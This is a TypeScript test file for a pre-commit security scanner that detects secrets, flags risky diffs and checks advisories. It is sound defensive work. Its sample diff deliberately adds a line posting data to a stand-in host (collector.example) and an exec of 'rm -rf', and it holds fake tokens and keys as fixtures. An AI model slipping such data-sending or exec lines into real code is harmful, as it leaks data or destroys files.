/**
 * security-scan.test.ts — F10 pre-commit security step tests.
 */
import { describe, it, expect } from 'vitest';
import {
  scanSecrets,
  scanDiff,
  addedLinesByFile,
  checkAdvisories,
  runSecurityScan,
} from './security-scan.js';

describe('secret scan (gitleaks-style)', () => {
  it('detects an AWS access key', () => {
    const hits = scanSecrets('const k = "AKIAIOSFODNN7EXAMPLE";', 'src/a.ts');
    expect(hits.some((h) => h.rule === 'aws-access-key')).toBe(true);
  });

  it('detects a GitHub PAT', () => {
    const hits = scanSecrets('token = "ghp_abcdefghijklmnopqrstuvwx"', 'x.py');
    expect(hits.some((h) => h.rule === 'github-pat')).toBe(true);
  });

  it('detects a PEM private key block', () => {
    const hits = scanSecrets('-----BEGIN RSA PRIVATE KEY-----\nMIIB...', 'k.pem');
    expect(hits.some((h) => h.rule === 'private-key-block')).toBe(true);
  });

  it('detects hardcoded passwords', () => {
    const hits = scanSecrets('password = "s3cr3t-p@ss"', 'cfg.js');
    expect(hits.some((h) => h.rule === 'password-assign')).toBe(true);
  });

  it('does not flag plain assignments inside .env files', () => {
    const hits = scanSecrets('API_KEY=abcdef1234567890', '.env');
    expect(hits.filter((h) => h.rule === 'generic-api-key')).toHaveLength(0);
  });

  it('never leaks the secret in the preview', () => {
    const secret = 'ghp_abcdefghijklmnopqrstuvwx';
    const hits = scanSecrets(`t="${secret}"`, 'a.ts');
    expect(hits.length).toBeGreaterThan(0);
    for (const h of hits) {
      expect(h.preview).not.toContain(secret);
    }
  });

  it('reports file and line numbers', () => {
    const hits = scanSecrets('a\nb\ntoken="ghp_abcdefghijklmnopqrstuvwx"\n', 'a.ts');
    expect(hits[0].file).toBe('a.ts');
    expect(hits[0].line).toBe(3);
  });
});

const SAMPLE_DIFF = `diff --git a/src/api.ts b/src/api.ts
index 111..222 100644
--- a/src/api.ts
+++ b/src/api.ts
@@ -1,2 +1,4 @@
 const x = 1;
+import axios from 'axios';
+axios.post('https://collector.example/log', { data });
diff --git a/src/run.ts b/src/run.ts
index 333..444 100644
--- a/src/run.ts
+++ b/src/run.ts
@@ -1 +1,2 @@
 // runner
+import { exec } from 'child_process';
+exec('rm -rf /tmp/cache');
diff --git a/package.json b/package.json
index 555..666 100644
--- a/package.json
+++ b/package.json
@@ -3,3 +3,4 @@
   "dependencies": {
+    "totally-new-dep": "^1.2.3",
     "existing": "^0.0.1"
   }
`;

describe('diff alerts', () => {
  it('parses added lines per file', () => {
    const m = addedLinesByFile(SAMPLE_DIFF);
    expect(m.get('src/api.ts')).toHaveLength(2);
    expect(m.get('package.json')!.some((l) => l.includes('totally-new-dep'))).toBe(true);
  });

  it('flags new network calls', () => {
    const alerts = scanDiff(SAMPLE_DIFF);
    const net = alerts.filter((a) => a.kind === 'new-network-call');
    expect(net.length).toBeGreaterThan(0);
    expect(net[0].file).toBe('src/api.ts');
  });

  it('flags new exec primitives', () => {
    const alerts = scanDiff(SAMPLE_DIFF);
    const ex = alerts.filter((a) => a.kind === 'new-exec');
    expect(ex.length).toBeGreaterThan(0);
    expect(ex[0].file).toBe('src/run.ts');
  });

  it('flags new dependencies', () => {
    const alerts = scanDiff(SAMPLE_DIFF);
    const dep = alerts.filter((a) => a.kind === 'new-dependency');
    expect(dep.length).toBeGreaterThan(0);
    expect(dep[0].file).toBe('package.json');
  });

  it('is quiet on benign diffs', () => {
    const diff = `diff --git a/a.ts b/a.ts\n+++ b/a.ts\n@@ -1 +1,2 @@\n const a = 1;\n+const b = 2;\n`;
    expect(scanDiff(diff)).toHaveLength(0);
  });
});

describe('advisory check (offline-first)', () => {
  it('reports skipped without a DB (honest coverage)', () => {
    const r = checkAdvisories([{ name: 'lodash', version: '4.17.21' }]);
    expect(r[0].status).toBe('skipped');
  });

  it('flags vulnerable deps when DB has an advisory', () => {
    const db = new Map([['lodash@4.17.20', ['GHSA-abc-123']]]);
    const r = checkAdvisories([{ name: 'lodash', version: '4.17.20' }], db);
    expect(r[0].status).toBe('vulnerable');
    expect(r[0].advisories).toEqual(['GHSA-abc-123']);
  });

  it('reports clean when DB has no advisory', () => {
    const db = new Map<string, string[]>();
    const r = checkAdvisories([{ name: 'lodash', version: '4.17.21' }], db);
    expect(r[0].status).toBe('clean');
  });
});

describe('runSecurityScan gate', () => {
  it('fails on secrets', () => {
    const r = runSecurityScan({
      stagedFiles: new Map([['a.ts', 'const t = "ghp_abcdefghijklmnopqrstuvwx";']]),
    });
    expect(r.passed).toBe(false);
    expect(r.secrets.length).toBeGreaterThan(0);
  });

  it('passes on clean input', () => {
    const r = runSecurityScan({
      stagedFiles: new Map([['a.ts', 'export const a = 1;']]),
      diff: 'diff --git a/a.ts b/a.ts\n+++ b/a.ts\n@@ -1 +1 @@\n-const a=0\n+export const a = 1;\n',
    });
    expect(r.passed).toBe(true);
  });

  it('diff alerts are advisory by default, blocking when configured', () => {
    const diff = SAMPLE_DIFF;
    expect(runSecurityScan({ diff }).passed).toBe(true);
    expect(runSecurityScan({ diff, failOnDiffAlerts: true }).passed).toBe(false);
  });
});
